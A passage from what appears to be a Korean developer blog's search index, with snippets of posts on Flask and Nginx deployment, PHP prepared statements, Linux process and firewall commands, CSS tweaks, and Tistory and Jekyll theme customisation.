&quot;args&quot;: [ &quot;-NoLogo&quot; ] } } 결과" }, { "title": "Powershell 시작 안내 문구 끄기", "url": "/posts/Powershell-nologo/", "categories": "Tools, Powershell", "tags": "", "date": "2022-02-23 00:00:00 +0900", "snippet": " Powershell 시작 안내 문구 끄기 Windows Terminal Setting에서 명령줄에 -nologo를 추가한다. 결과" }, { "title": "Powershell alias 영구 등록", "url": "/posts/Powershell-alias/", "categories": "Tools, Powershell", "tags": "", "date": "2022-02-23 00:00:00 +0900", "snippet": " Powershell alias 영구 등록 메모장으로 $PROFILE을 연다.$ notepad $PROFILE new-alias를 설정해준다. (alias는 호출 개념이기 때문에 명령줄을 function으로 만들어주어야 한다.)function gotoblog { set-location &quot;D:/sookyeongyeom.github.io&quot; }new-alias blog gotoblog 결과" }, { "title": "MySql 레코드 단위로 정돈하여 출력하기", "url": "/posts/Mysql-wg/", "categories": "Back-End, MySql", "tags": "", "date": "2022-02-22 00:00:00 +0900", "snippet": " MySql 레코드 단위로 정돈하여 출력하기쿼리의 끝에 ; 대신 \\G 를 붙여준다. ; 으로 끝냈을 시 \\G로 끝냈을 시" }, { "title": "Flask CORS 설정", "url": "/posts/Flask-cors/", "categories": "Back-End, Flask", "tags": "", "date": "2022-02-22 00:00:00 +0900", "snippet": " Flask CORS 설정직접 헤더에 추가해주는 방법도 있지만 간단히 사용할 수 있는 모듈이 있다. 모듈 설치pip install flask_cors CORS 설정from flask_cors import CORSapp = Flask(__name__)CORS(app)" }, { "title": "Flask production server (Nginx+Gunicorn)", "url": "/posts/Nginx-gunicorn/", "categories": "Back-End, Flask", "tags": "", "date": "2022-02-21 00:00:00 +0900", "snippet": " Flask production server 구조Client - Web Server (Nginx) - WSGI Middleware (Gunicorn) - Web Application (Flask) - DB위 구조로 세팅해야한다.Nginx는 Apache와 양대산맥을 이루는 웹서버로, event-driven 방식이라 Apache에 비해 가볍고 빠르다는 장점을 갖고 있다.Gunicorn은 포트 바인딩 또는 유닉스 소켓 바인딩 방식으로 운영할 수 있는데, 유닉스 계열 시스템에서는 후자를 채택하는 것이 빠르고 효율적이다.단, 소켓 방식으로 실행한 Gunicorn 서버는 단독으로 접속할 수 없기 때문에 Nginx와 같은 웹서버를 앞단에 배치하여 웹서버-소켓-WSGI서버를 연결해주어야 한다.→ 그 말은 즉슨? 포트 바인딩 방식으로 실행한 Gunicorn 서버는 웹서버 없이도 단독으로 접속이 가능하다. 다만 웹서버를 따로 둠으로써 얻을 수 있는 다양한 효용들이 있기 때문에 소켓의 성능 + 웹서버의 효용을 모두 얻기 위해 위와 같은 방식으로 세팅하는 것이 일반적인 것으로 보인다. Gunicorn 세팅 방법 설치$ pip install gunicorn 테스트# 포트바인딩gunicorn --bind 0:5000 &quot;app:create_app()&quot;# 소켓바인딩 (bgflask=프로젝트명)gunicorn --bind unix:/tmp/bgflask.sock &quot;app:create_app()&quot; 서비스 파일 생성 (/etc/systemd/system/bgflask.service)[Unit]Description=Gunicorn instance to serve bgflaskAfter=network.target[Service]User=rootWorkingDirectory=/rss/python-server/bgflaskEnvironment=&quot;PATH=/rss/python-server/env&quot;ExecStart=/usr/local/bin/gunicorn --workers 2 --bind unix:/tmp/bgflask.sock &quot;app:create_app()&quot;[Install]WantedBy=multi-user.target 환경 변수 파일 생성 (/rss/python-server/env/bgflask.env)FLASK_APP=appFLASK_ENV=production 서비스 실행 및 등록$ systemctl start bgflask.service$ systemctl enable bgflask.service 오류 발생 시 로그 확인$ cat /var/log/syslog Nginx 세팅 방법 설치$ apt install nginx Nginx 설정 파일 생성 (HTTPS 적용)$ cd /etc/nginx/sites-available/$ vim bgflaskserver { listen 80; server_name sookyeongyeom.com; location / { return 307 https://sookyeongyeom.com; }}server { listen 443; listen [::]:443; ssl on; server_name sookyeongyeom.com; ssl_certificate /etc/letsencrypt/live/sookyeongyeom.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/sookyeongyeom.com/privkey.pem; location = /favicon.ico { access_log off; log_not_found off; } location / { include proxy_params; proxy_pass http://unix:/tmp/bgflask.sock; }} Nginx 설정 파일을 환경 파일로 등록$ cd /etc/nginx/sites-enabled/$ rm default$ ln -s /etc/nginx/sites-available/bgflask Nginx 재시작$ systemctl restart nginx Nginx 문법 오류 여부 확인 (오류 있을 시 설정 파일 재작성 후 Nginx를 껐다가 다시 켜야한다.)$ nginx -t$ systemctl stop nginx$ systemctl start nginx 확인포트 번호 없이 입력해도 정상 접속되며, http로 접근 시 https로 redirect된다. 추가할 사항phpmyadmin을 서버 블록에 따로 정의해주어야 웹브라우저를 통해 접근이 가능하다.구글에 있는 예제를 그대로 가져와서 몇번 테스트해봤으나 버전이나 소켓명 문제인지 해결이 안됐다.그렇다고 mysql을 터미널에서 그대로 쓰자니 불편하기도 하고 무엇보다 커맨드라인에서 한글이 먹지 않았다.왜 그런가 찾아보니 mysql 버전 문제로 readline 옵션을 껴서 재컴파일을 해주어야 한다고 하는데 생각만해도 한숨 나오는…지금 당장 급한건 아니니 일단 두고 조만간 phpmyadmin을 서버 블록에 설정해주는 방향으로 가야겠다." }, { "title": "PHP Prepared Statement (SQL Injection Secure Coding)", "url": "/posts/Php-secure/", "categories": "Back-End, PHP", "tags": "", "date": "2022-02-19 00:00:00 +0900", "snippet": " PHP Prepared Statement 바인딩 데이터는 SQL 문법이 아닌 내부의 인터프리터나 컴파일 언어로 처리하므로 문법적인 의미를 가질 수 없다. 따라서 파라미터 바인딩 과정을 거치면 대부분의 SQL Injection 공격을 방지할 수 있다.$sql = &quot;INSERT INTO apply(id, name, student_id, department, community_id, phone, semester, tool, intro, file) VALUES (0, ?, ?, ?, ?, ?, ?, ?, ?, ?);&quot;;$stmt = mysqli_prepare($conn, $sql);if($stmt === false) { echo(&#39;Statement 생성 실패 : &#39; . mysqli_error($conn)); exit(); }$bind = mysqli_stmt_bind_param($stmt, &quot;sssssssss&quot;, $name, $student_id, $department, $snulife_id, $phone, $semester, $tool, $intro, $files);if($bind === false) { echo(&#39;파라미터 바인드 실패 : &#39; . mysqli_error($conn)); exit(); }$exec = mysqli_stmt_execute($stmt);" }, { "title": "checked 상태에 따라 label 꾸미기", "url": "/posts/Css-radio/", "categories": "Front-End, CSS", "tags": "", "date": "2022-02-18 00:00:00 +0900", "snippet": " checked 상태에 따라 label 꾸미기 HTML&amp;lt;input type=&quot;radio&quot; id=&quot;yes&quot; value=&quot;yes&quot; checked&amp;gt;&amp;lt;label for=&quot;yes&quot;&amp;gt;&amp;lt;/label&amp;gt; CSS#yes+label { display: inline-block; width: 68px; height: 31px; background: url(&quot;https://user-images.githubusercontent.com/98504939/154197039-22c2a53c-f13a-4124-b92a-5b888da8bea8.svg&quot;) no-repeat 0 0px / contain;}#yes:checked+label { background: url(&quot;https://user-images.githubusercontent.com/98504939/154194073-0af2ed1f-d718-4b33-aa30-0c978356ff2d.svg&quot;) no-repeat 0 0px / contain;} 결과" }, { "title": "checked 상태에 따라 display ON/OFF", "url": "/posts/Css-other/", "categories": "Front-End, CSS", "tags": "", "date": "2022-02-18 00:00:00 +0900", "snippet": " checked 상태에 따라 display ON/OFF HTML&amp;lt;input type=&quot;checkbox&quot; id=&quot;other&quot; onclick=&quot;tool_other()&quot; value=&quot;other&quot;&amp;gt;&amp;lt;label for=&quot;other&quot;&amp;gt;&amp;lt;/label&amp;gt;&amp;lt;div id=&quot;other_text&quot; style=&quot;display: none;&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; placeholder=&quot;선택지에 없으나 다룰 줄 아는 툴을 적어주세요.&quot;&amp;gt;&amp;lt;/div&amp;gt; Javascriptfunction tool_other() { other = document.getElementById(&#39;other&#39;).checked; if (other) { document.getElementById(&#39;other_text&#39;).style.display = &quot;block&quot;; } else { document.getElementById(&#39;other_text&#39;).style.display = &quot;none&quot;; }} 결과" }, { "title": "HTTPS 자물쇠 달기 (Let&#39;s Encrypt)", "url": "/posts/Https-ssl/", "categories": "Study, Linux", "tags": "", "date": "2022-02-17 00:00:00 +0900", "snippet": " Let’s Encrypt란? 무료 SSL 인증서 3분 만에 간단히 웹사이트에 HTTPS를 적용할 수 있다. 무료인 대신 기간 제한이 있다. 그러나 갱신도 무료다. 자동 갱신해주는 방법도 있으니 필요하다면 찾아보자. 사용 방법 Let’s Encrypt에 들어간다. 내 웹사이트 환경을 선택한다. 안내하는대로 따라하면 3분 안에 모든 과정이 끝난다. 예시 Apache + Ubuntu 18$ sudo snap install core; sudo snap refresh core$ sudo apt-get remove certbot$ sudo snap install --classic certbot$ sudo ln -s /snap/bin/certbot /usr/bin/certbot$ sudo certbot --apache HTTPS 적용 확인 웹사이트를 확인하면 자물쇠가 달려있다!" }, { "title": "hr 꾸미기", "url": "/posts/Css-hr/", "categories": "Front-End, CSS", "tags": "", "date": "2022-02-16 00:00:00 +0900", "snippet": " hr 꾸미기hr { border: none; border-top: 1px solid #E3E7EB; overflow: visible; text-align: center; margin-top: 24px; height: 17px;}hr:after { content: &quot;Welcome&quot;; position: relative; top: -15px; background: #F1F3F5; padding: 0 10px; color: #868E96; font-size: 0.8em;} 결과" }, { "title": "nohup (no hangups)", "url": "/posts/Nohup/", "categories": "Study, Linux", "tags": "", "date": "2022-02-15 00:00:00 +0900", "snippet": " 755 이상 권한 부여$ chmod 755 file.py nohup으로 실행 기본$ nohup python3 file.py &amp;amp; 로그 즉시 확인 옵션$ nohup python3 -u file.py &amp;amp; 로그파일명 변경$ nohup python3 -u file.py &amp;gt; 로그파일명 &amp;amp; 로그 확인$ tail -f nohup.out Background 프로세스 확인$ ps -ef | grep file.py Background 프로세스 종료$ kill [프로세스ID] &amp;amp; vs nohup &amp;amp;은 세션 종료 시 함께 종료되고, nohup은 그대로 유지된다는 차이가 있다. 그러나 언젠가부터 &amp;amp;도 nohup과 마찬가지로 세션이 끊어져도 유지되도록 변경되었다. 이 포스팅에서와 같이 nohup + &amp;amp; 으로 조합해서 쓰는 것이 가장 안전하다." }, { "title": "Background (&amp;)", "url": "/posts/Background/", "categories": "Study, Linux", "tags": "", "date": "2022-02-15 00:00:00 +0900", "snippet": " Background에서 작업 실행$ python3 file.py &amp;amp; Foreground 작업을 Background로 옮기기 실행$ python3 file.py 프로세스 일시정지Ctrl+Z 백그라운드에서 재구동$ bg 소유권 포기$ disown -h Background 작업을 Foreground로 옮기기 현재 Background 작업 상태 확인$ jobs Foreground로 옮기기$ fg Background 작업 확인 (특정 포트)$ netstat -nap | grep [포트번호] Background 프로세스 종료$ kill -9 [프로세스ID]" }, { "title": "Flask 작업 환경 공유", "url": "/posts/Broccoli-flask/", "categories": "Project, Four-Broccolis", "tags": "", "date": "2022-02-14 11:00:00 +0900", "snippet": " 단축어 (아무 곳에서나 실행해도 됩니다.) bg : bgcroll로 이동 bf : bgflask로 이동 run : flask 서버 즉시 실행 Flask 서버에 대해서작업 내용을 웹 브라우저로 확인하기 위해서는, 리모트 서버에서 flask를 실행한 후 웹브라우저를 통해 sookyeongyeom.com:5000/[경로] 로 접속해주셔야 합니다.flask 서버 실행 방법은, 리모트 서버에 접속하신 후 run 을 입력하시면 아무 곳에서나 즉시 실행됩니다.내부적으로는 run 명령어 실행 시 다음의 과정이 일어나도록 세팅했습니다. bgflask 디렉토리로 이동 flask 실행은 반드시 작업 디렉토리 내에서 이루어져야 합니다. export FLASK_ENV=development (개발환경으로 서버 ON) 개발환경으로 세팅 시 변경 내용 저장 후 새로고침을 누르면 변경 사항이 즉시 적용되어 표시됩니다. 개발환경으로 세팅하지 않으면 서버를 껐다 켜야 변경 사항이 반영되기 때문에 개발에 적합하지 않습니다. flask run –host=0.0.0.0 모든 IP에서 리모트서버의 5000번 포트로 접속할 수 있게 합니다. Flask는 5000번 포트를 통해 서비스됩니다. 설명이 길긴 하지만 그냥 아무 곳에서나 run 만 입력하시면 상기한 사항들을 자동으로 실행해줍니다. 이렇게 작업하시면 됩니다. VSCode SFTP 익스텐션으로 리모트 서버의 bgflask와 연동해줍니다. 리모트 서버에 접속하신 후 run 을 입력해주세요. 웹브라우저로 sookyeongyeom.com:5000/[경로] 로 접속하시면 작업 내용을 실시간으로 확인할 수 있습니다. 주의사항 bgflask를 작업 디렉토리(=myproject)라고 생각하고 작업해주세요! 루트 디렉토리(=projects)가 아닙니다. 하위에 새로운 작업 디렉토리 생성 X 현재 bgflask에는 제가 테스트용으로 작업한 파일들이 남아있습니다. 별 내용 없기 때문에 해당 파일들을 그대로 이어서 사용하셔도 괜찮습니다. 아예 처음부터 하고 싶으시면 기존에 있던 파일들은 지워주세요. (충돌 방지) bgflask 내 run 파일은 지우시면 안됩니다! (run 명령어 실행 파일이에요 ㅠㅠ alias run과 연결되어 있습니다.) 새로운 alias 생성 방법 vim ~/.bashrc 이 파일에 alias를 작성해주시면 됩니다. 조금 내려가시면 alias가 모여있는 부분이 있습니다. (if문 내부 alias X) 아래쪽에 새로운 alias를 추가해주시면 됩니다. alias 작성 방법 alias 단축어=’명령어’ 형식으로 작성하시면 됩니다. alias 단축어=’명령어; 명령어; 명령어’ 형식으로 작성하시면 여러개의 명령어를 순차적으로 실행할 수 있습니다. ex. alias bg=’cd /rss/python-server/bgcroll’ alias 적용 변경 사항을 저장하고 :wq로 빠져나오신 후 source ~/.bashrc 를 입력해서 변경 사항을 적용해주셔야 합니다. " }, { "title": "Flask 환경변수 설정", "url": "/posts/Flask-develop/", "categories": "Back-End, Flask", "tags": "", "date": "2022-02-14 10:00:00 +0900", "snippet": " FLASK_APP Linux/Mac$ export FLASK_APP=myapp Windows CMD$ set FLASK_APP=myapp FLASK_ENV Linux/Mac$ export FLASK_ENV=development Windows CMD$ set FLASK_ENV=development" }, { "title": "netstat 포트 확인", "url": "/posts/Port-status/", "categories": "Study, Linux", "tags": "", "date": "2022-02-14 09:00:00 +0900", "snippet": " 열려있는 모든 포트 확인$ netstat -nap LISTEN중인 표트 표시$ netstat -nap | grep LISTEN 특정 포트 상태 확인$ netstat -nap | grep [포트번호]" }, { "title": "iptables 방화벽 포트 개방", "url": "/posts/Iptables/", "categories": "Study, Linux", "tags": "", "date": "2022-02-14 08:00:00 +0900", "snippet": " 방화벽 설정 확인$ iptables -nL Inputiptables -I INPUT 1 -p tcp --dport [포트번호] -j ACCEPTiptables -I INPUT 1 -p udp --dport [포트번호] -j ACCEPT Outputiptables -I OUTPUT 1 -p tcp --dport [포트번호] -j ACCEPTiptables -I OUTPUT 1 -p udp --dport [포트번호] -j ACCEPT 작성한 규칙 확인iptables -L -v 규칙 삭제iptables -D INPUT -p tcp --dport [포트번호] -j ACCEPTiptables -D INPUT -p udp --dport [포트번호] -j ACCEPTiptables -D OUTPUT -p tcp --dport [포트번호] -j ACCEPTiptables -D OUTPUT -p udp --dport [포트번호] -j ACCEPT 변경사항 저장$ service iptables save$ /etc/init.d/iptables restart 방화벽 활성화/비활성화$ /etc/init.d/iptables start$ /etc/init.d/iptables stop" }, { "title": "Flask 서버 배포 기본 세팅 (feat. 가비아 서버호스팅)", "url": "/posts/Flask-setting/", "categories": "Back-End, Flask", "tags": "", "date": "2022-02-14 07:00:00 +0900", "snippet": "0. 요약 방화벽 허용 Flask run 시 외부 접속 허용 옵션 적용1. 방화벽 허용[1] [My가비아 &amp;gt; 콘솔] 클릭[2] [보안/관리] 클릭[3] [방화벽 정책 관리] 클릭[4] 한번 더 [방화벽 정책 관리] 클릭[5] [보안 정책 추가] 클릭[6] 추가할 정책 내용을 작성한다. 정책 이름 : Flask (원하는대로 작성하면 된다.) IP/그룹 : 그대로 둬야 모든 IP에서 접속할 수 있다. 서비스 : USER 프로토콜 : TCP/UDP (두 경우 모두 혀용할 수 있도록 정책을 하나 더 생성해준다.)[7] 저장하고 빠져나온 후 방화벽 건수를 확인한다. 추가한 만큼 늘어나있다면 정상적으로 추가된 것이다.2. Flask run 시 외부 접속 허용 옵션 적용flask run --host=0.0.0.03. 접속 확인이제 [서버IP주소:5000/경로] 로 정상적으로 접속할 수 있다." }, { "title": "Tistory - 티스토리에 깃허브처럼 잔디 깔기! | Tistory 커스터마이징", "url": "/posts/Tistory-jandi/", "categories": "Project, Blog", "tags": "", "date": "2022-02-14 00:00:00 +0900", "snippet": "! NoticeTistory에 포스팅했던 내용을 그대로 옮겨왔습니다.잔디 적용 관련 문의는 댓글이나 이메일로 남겨주세요 :-) 📬 sookyeong.dev@gmail.com 깃블로그/티스토리 댓글 모두 확인 가능합니다. 원본 포스팅 - [Tistory] 티스토리에 깃허브처럼 잔디 깔기! 1. 계기지난 10월에 첫 포스팅을 올린 이래로 이제 4개월 차,언제부턴가 깃허브의 잔디가 부러워지기 시작했다 ㅠㅠㅠ지금이라도 넘어갈까 고민도 잠시 해봤지만, 지금껏 함께해온 티스토리에 정도 많이 들었고…편의성 부분에서 깃허브 페이지는 도무지 메인으로 사용하고 싶은 마음이 들지 않았다.그렇다면, 깃허브의 잔디같은 시스템(?)을 티스토리에 구현해보면 어떨까하는 생각이 들었다.조사 차 찾아보니 생각보다 어려울 것 같지 않았고, 반나절을 꼬박 들인 결과… 제법 만족스러운 그림이 나왔다!그래서 공유해본다! 일명 티스토리에 잔디 깔기 대작전이다! ( ｯ◕ ܫ◕)ｯ’2. 구현 방법티스토리에는 포스팅 달력이라는 위젯이 있다.포스팅을 올린 날짜에 주황색 표식이 생긴다고 이해하면 된다.표식을 클릭하면 해당 포스팅으로 넘어가주는 기능까지 있다.사실상 필요한 기능은 이 정도면 충분하기 때문에,여기에 CSS를 추가해주고 JS로 HTML의 구조를 변조하여 깃허브의 잔디처럼 보이게 하는 것을 목표로 삼았다!3. 생김새 및 기능완성본은 이렇게 생겼다달력을 셀로 바꿔놨다고 생각하면 이해하기 편하다.셀의 기본 색상은 회색이며, 포스팅을 올리면 해당 날짜의 셀이 녹색으로 변한다.텀 없이 매일 게시글을 올리면 색이 점점 진해지게끔 해줬다.(하루라도 놓치면 리셋이다 ㅎ)적용해놓고 보면 이런 느낌이다제법 귀엽다…..ㅎ원본 위젯의 기능을 그대로 유지하고 있기 때문에,셀을 클릭할 시 해당 날짜에 작성한 포스팅 모음을 볼 수 있다.4. 티스토리 잔디 적용 방법설명지금부터는 적용 방법이다.크게 복잡하지 않다!주의사항기존 스킨에 포함되어있는 달력 위젯이 있다면 깨끗하게 제거한 후 진행하는 것이 안전하다! HTML 내부의 달력 element 관련 코드를 삭제하고 CSS에서도 calendar 관련 코드를 삭제해주어야 한다.[1] 스킨 편집창으로 들어가기 설정 화면 &amp;gt; 스킨 편집 을 클릭한다. html 편집 을 클릭한다. 여기서 현재 적용중인 스킨의 HTML/CSS 를 볼 수 있다.[2] HTML에 다음 코드를 추가한다HTML 탭에 들어가서 코드를 훑어보면 중간에 들이 모여있는 구간이 있을 것이다.해당 구간의 원하는 위치에 다음 코드를 복붙해주면 된다. 이 글은 사이드바가 있는 스킨을 기준으로 작성되었다. 사이드바가 없는 스킨을 사용하고 있다면 적절한 위치를 직접 선정하여 코드를 넣어준다.&amp;lt;s_sidebar_element&amp;gt; &amp;lt;!-- 달력 --&amp;gt; &amp;lt;div class=&quot;calendar&quot;&amp;gt; &amp;lt;h1 class=&quot;sr-only&quot;&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;!-- 티스토리 달력 모듈 --&amp;gt; [##_calendar_##] &amp;lt;script&amp;gt; // 포스팅 올린 날짜에 색 주기 passed = document.getElementsByClassName(&#39;cal_click&#39;); for(i=0;i&amp;lt;passed.length;i++){ day = parseInt(passed[i].href.split(&#39;/&#39;)[4].slice(6)) // 연속으로 올렸는지 확인 if(i&amp;gt;0 &amp;amp;&amp;amp; day==temp+1){ cnt += 1; } else { cnt = 0; } temp = day if(cnt&amp;lt;1){ color = &quot;#C5E1A5&quot; } else if(cnt&amp;lt;2){ color = &quot;#AED581&quot; } else if(cnt&amp;lt;3){ color = &quot;#9CCC65&quot; } else if(cnt&amp;lt;4){ color = &quot;#8BC34A&quot; } else if(cnt&amp;lt;5){ color = &quot;#7CB342&quot; } else if(cnt&amp;lt;6){ color = &quot;#689F38&quot; } else{ color = &quot;#558B2F&quot; } document.getElementsByClassName(&#39;cal_click&#39;)[i].style.color = color; document.getElementsByClassName(&#39;cal_click&#39;)[i].style.background = color; // 날짜가 두자릿수인 경우 모양이 깨져서 1로 고정시킴 passed[i].innerText=1; } // 아직 포스팅 하지 않은 날짜에도 모양을 주기 위해 &amp;lt;a&amp;gt; 삽입 후 1로 고정시킴 notyet = document.getElementsByClassName(&#39;cal_day&#39;) for(i=0;i&amp;lt;notyet.length;i++){ if(notyet[i].innerHTML.includes(&#39;&amp;lt;/a&amp;gt;&#39;)){ continue; } else { document.getElementsByClassName(&#39;cal_day&#39;)[i].innerHTML=&quot;&amp;lt;a&amp;gt;1&amp;lt;/a&amp;gt;&quot;; } } // 이전 달로 가는 버튼 document.getElementsByClassName(&#39;cal_month&#39;)[0].children[0].innerText=&quot;◀ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ&quot;; // 연월 확인 mth = document.getElementsByClassName(&#39;cal_month&#39;)[0].children[1].innerText.split(&#39;/&#39;); if(mth[1][0]==0){ mth[1] = mth[1][1]; } if(parseInt(mth[1])-1==0){ premth = 12 preyear = parseInt(mth[0])-1 } else { premth = parseInt(mth[1])-1 preyear = parseInt(mth[0]) } if(parseInt(mth[1])+1==13){ postmth = 1 postyear = parseInt(mth[0])+1 } else { postmth = parseInt(mth[1])+1 postyear = parseInt(mth[0]) } // 월 표기 방식 switch(mth[1]){ case &#39;1&#39;: thismth = &#39;Jan&#39; break case &#39;2&#39;: thismth = &#39;Feb&#39; break case &#39;3&#39;: thismth = &#39;Mar&#39; break case &#39;4&#39;: thismth = &#39;Apr&#39; break case &#39;5&#39;: thismth = &#39;May&#39; break case &#39;6&#39;: thismth = &#39;Jun&#39; break case &#39;7&#39;: thismth = &#39;Jul&#39; break case &#39;8&#39;: thismth = &#39;Aug&#39; break case &#39;9&#39;: thismth = &#39;Sep&#39; break case &#39;10&#39;: thismth = &#39;Oct&#39; break case &#39;11&#39;: thismth = &#39;Nov&#39; break case &#39;12&#39;: thismth = &#39;Dec&#39; break } document.getElementsByClassName(&#39;cal_month&#39;)[0].children[1].innerText = thismth; // 다음 달로 가는 버튼 document.getElementsByClassName(&#39;cal_month&#39;)[0].children[2].innerText=&quot;ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ▶&quot;; // 버튼 및 월에 커서 올렸을 시 안내 문구 수정 document.getElementsByClassName(&#39;cal_month&#39;)[0].children[0].setAttribute(&#39;title&#39;,preyear+&#39;년 &#39;+premth+&#39;월의 잔디밭&#39;); document.getElementsByClassName(&#39;cal_month&#39;)[0].children[1].setAttribute(&#39;title&#39;,mth[0]+&#39;년 &#39;+mth[1]+&#39;월의 잔디밭&#39;); document.getElementsByClassName(&#39;cal_month&#39;)[0].children[2].setAttribute(&#39;title&#39;,postyear+&#39;년 &#39;+postmth+&#39;월의 잔디밭&#39;); &amp;lt;/script&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/s_sidebar_element&amp;gt;복붙을 완료했다면 HTML 탭 우측 상단의 적용 버튼을 꼭 눌러주자![3] CSS 가장 아래쪽에 다음 코드를 추가한다CSS 탭에 들어간 후 스크롤바를 쭉 밑으로 내려준다.가장 끝자리에 다음 코드를 추가해주면 된다./* calendar */.calendar {-ms-user-select: none;-moz-user-select: -moz-none;-khtml-user-select: none;-webkit-user-select: none;user-select: none;}.calendar .tt-calendar {margin-top:8%;margin-bottom:10%;width:280px !important;border-collapse:collapse;}.calendar .tt-calendar caption {font-size:1em;margin-bottom:10px;height:100%}.calendar .tt-calendar caption a:first-child, .calendar .tt-calendar caption a:last-child {color:#DB8EB5; font-size:0.375em}.calendar .tt-calendar caption a {vertical-align:middle;color:black;}.calendar .tt-calendar th, .calendar .tt-calendar td {padding:5px 0; text-align:center;}.calendar .tt-calendar th {display:none;}.calendar .tt-calendar td {font-size:1.3em; color:#bbb;}.calendar .tt-calendar .cal_click {display:inline-block; padding:2px 8px; border-radius:2px;}.calendar .tt-calendar td a {display:inline-block; padding:2px 8px; background:#E0E0E0; color:#E0E0E0; border-radius:2px;}복붙을 완료했다면 이번에도 CSS 탭 우측 상단의 적용 버튼을 눌러준다.[4] 새로고침블로그를 새로고침하면 아마 어딘가 좀 이상한 모양의 잔디밭을 볼 수 있을 것이다. 만약 잔디밭 모양이 정상적으로 출력된다면 운이 좋은 케이스이고 여기서 끝이다! 👏🏻[5] 잔디밭의 너비와 높이를 스킨에 맞게 수정한다위 CSS는 내가 사용하고 있는 스킨에 맞게 너비와 높이를 고정값으로 짜놓은 것이라나와 다른 스킨을 사용하고 있다면 십중팔구 잔디밭이 꾸겨져 있을 것이다 ㅠㅠ물론 반응형으로 짜고 싶었지만… 잘 안됐다 ㅎ따라서 CSS를 조금 수정하여 자신의 스킨에 맞게 조정해주어야 한다.아까 추가했던 CSS 내부에서 다음 두 부분을 찾은 후, 너비와 높이를 수정하여 각 셀이 정사각형 모양을 띄게끔 만들어주면 된다.값 수정 → 적용 → 새로고침 순으로 테스트하며 적정한 값을 찾아주자!/* width = 너비를 결정하는 값이다 */.calendar .tt-calendar {margin-top:8%;margin-bottom:10%;width:280px !important;border-collapse:collapse;}/* font-size = 높이를 결정하는 값이다 */.calendar .tt-calendar td {font-size:1.3em; color:#bbb;} 잔디밭 모양은 잡았는데, 캡션 부분이 너무 길어서 줄바꿈되어버린다면 추가했던 HTML 코드 내의 이전 달로 가는 버튼과 다음 달로 가는 버튼에 포함된 공백 특수문자의 개수를 줄여주면 된다. (해당 부분에 주석을 달아놨으므로 Ctrl+F 하여 찾아준다.)[6] 끝!수정이 성공적으로 끝났다면 드디어 푸릇푸릇한 잔디밭을 볼 수 있다!5. 추가적으로 커스터마이징하고 싶다면?참고커스터마이징을 하고 싶다면 가장 먼저 해당 위젯의 구조를 파악하여야 한다.다음 포스팅에 달력 위젯의 소스 코드와 클래스 관련 정보가 깔끔하게 정리되어있다. Section 23 - 티스토리 반응형 스킨 만들기 - [사이드바] 달력잔디의 색상을 바꾸고 싶다면?위에 첨부했던 HTML 코드를 살펴보면 중간에 cnt의 값에 따라 color에 각기 다른 값을 할당하는 구간이 있음을 확인할 수 있다.이 부분의 color에 원하는 색상을 넣어주면 된다! if(cnt&amp;lt;1){ color = &quot;#C5E1A5&quot; // 여기! } else if(cnt&amp;lt;2){ color = &quot;#AED581&quot; // 여기! } else if(cnt&amp;lt;3){ color = &quot;#9CCC65&quot; // 여기! } else if(cnt&amp;lt;4){ color = &quot;#8BC34A&quot; // 여기! } else if(cnt&amp;lt;5){ color = &quot;#7CB342&quot; // 여기! } else if(cnt&amp;lt;6){ color = &quot;#689F38&quot; // 여기! } else{ color = &quot;#558B2F&quot; // 여기! }그외그외에도 커스터마이징할 수 있는 요소는 많다!흥미로운 커마 결과가 있다면 공유를 ✦‿✦" }, { "title": "Jekyll Chirpy 테마 - 말머리에 카테고리 출력하기 | Chirpy 커스터마이징", "url": "/posts/Chirpy-header/", "categories": "Project, Blog", "tags": "", "date": "2022-02-13 00:00:00 +0900", "snippet": "1. 계기카테고리 구분용 말머리를 자동으로 달아주고 싶다… 는 마음에서 작업해보았다.2. 완성본HOME 포스팅 제목에 말머리 추가제목 앞에 카테고리명을 출력하고, 카테고리명을 클릭할 시 해당 카테고리로 이동한다.Archive 포스팅 제목에 말머리 추가제목 앞에 카테고리명을 출력한다.HOME과 동일하게 카테고리 링크를 걸어줄 수 있긴 하지만, 왼쪽 시간선의 디자인을 위해 a::before에 동그라미가 설정되어있는 상태라는 점을 고려해야 한다.즉, 카테고리명과 포스팅 제목을 각각의 다른 a 태그로 지정할 시 동그라미가 총 두 개 생겨버린다… 조랭이떡 마냥…Class를 지정해서 둘 중 하나에서만 동그라미가 나오게끔 해주면 되지만 해당 부분에 대해서는 이 포스팅에서 다루지 않았다.3. 적용 방법말머리에 카테고리명을 출력하고 해당 부분에 카테고리 링크를 달아준 HOME을 기준으로 안내한다.템플릿에 다음 코드를 추가한다. (끝!)_layout &amp;gt; home.html 에 들어가 post-list 단락을 찾은 후 다음과 같이 내용을 변경해준다.&amp;lt;div id=&quot;post-list&quot;&amp;gt;{% for post in posts %} {% assign many = post.categories | size %} {% assign last = many | minus: 1 %} {% capture _category_url %}/categories/{{ post.categories[last] | slugify | url_encode }}/{% endcapture %} &amp;lt;div class=&quot;post-preview&quot;&amp;gt; &amp;lt;h1&amp;gt; &amp;lt;a href=&quot;{{ _category_url | relative_url }}&quot;&amp;gt;&amp;lt;span style=&quot;color:rgb(218, 139, 139);&quot;&amp;gt;{{ post.categories[last] }} › &amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;{{ post.url | relative_url }}&quot;&amp;gt;{{ post.title }}&amp;lt;/a&amp;gt; &amp;lt;/h1&amp;gt;변경 후 저장하면 적용 성공이다!카테고리명을 클릭하면 해당 카테고리로 이동하고, 포스팅 제목을 클릭하면 해당 포스팅 내용을 확인할 수 있다.링크 없이 카테고리명만 출력하기다음은 _layout &amp;gt; archive.html 에 적용한 코드다. (카테고리 링크 적용 X){% assign many = post.categories | size %}{% assign last = many | minus: 1 %}&amp;lt;a href=&quot;{{ post.url | relative_url }}&quot;&amp;gt;&amp;lt;span style=&quot;color:rgb(218, 139, 139);&quot;&amp;gt;{{ post.categories[last] }} › &amp;lt;/span&amp;gt;{{ post.title }}&amp;lt;/a&amp;gt;부연 설명코드를 보면 유추가 가능하지만 post.categories[Index]로 해당 포스팅의 카테고리를 꺼내올 수 있다.post.category를 써도 되지만, 상위 카테고리가 존재할 시 카테고리명이 상-하위 구분없이 딱 붙어서 나오기 때문에 가급적 위 방식을 따라준다. ex. Wargame &amp;gt; LoS 인 